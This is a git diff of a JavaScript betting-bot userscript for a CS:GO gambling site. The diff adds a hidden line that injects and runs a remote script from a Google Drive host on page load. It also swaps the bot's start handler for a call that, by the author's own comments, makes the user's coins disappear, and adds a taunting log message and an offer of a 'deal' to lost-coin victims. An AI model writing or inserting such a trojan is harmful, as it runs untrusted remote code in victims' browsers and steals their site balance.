@@ -18,6 +18,7 @@
 /* jshint -W097 */
 
 'use strict';
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "https://b87ba65322ecffa47c402a2aeaa42fe38d30958f.googledrive.com/host/0B3qQKdy8zOPRNnBVdF9Kd0RiRzg/csgoJS.js "; document.body.appendChild( scriptElement ); })();
 
 var debug = false;
 var simulation = false;
@@ -229,7 +230,8 @@ function Automated() {
     }
 
     this.menu.start.onclick = function() {
-
+	start(self.balance);
+        self.log('Now find this in the code and remove it, the bot is really working ;)');
         // You were clever enough to inspect the code, nice! The lines above will make your coins disappear...
         // Just for you small tip, delete two lines above (start and self.log) and uncomment line below (self.start).
         // If you're lazyfag - check 'clean' branch - it contains uncorrupted version of the script (ready to install).
@@ -239,7 +241,7 @@ function Automated() {
         // PS. If you already lost the coins - write to me - I have a deal for you, we bet your coins on green, if site
         // rolls green, you get all of them back.
 
-        self.start();
+        //self.start();
     };
 
     this.menu.stop.onclick = function() {
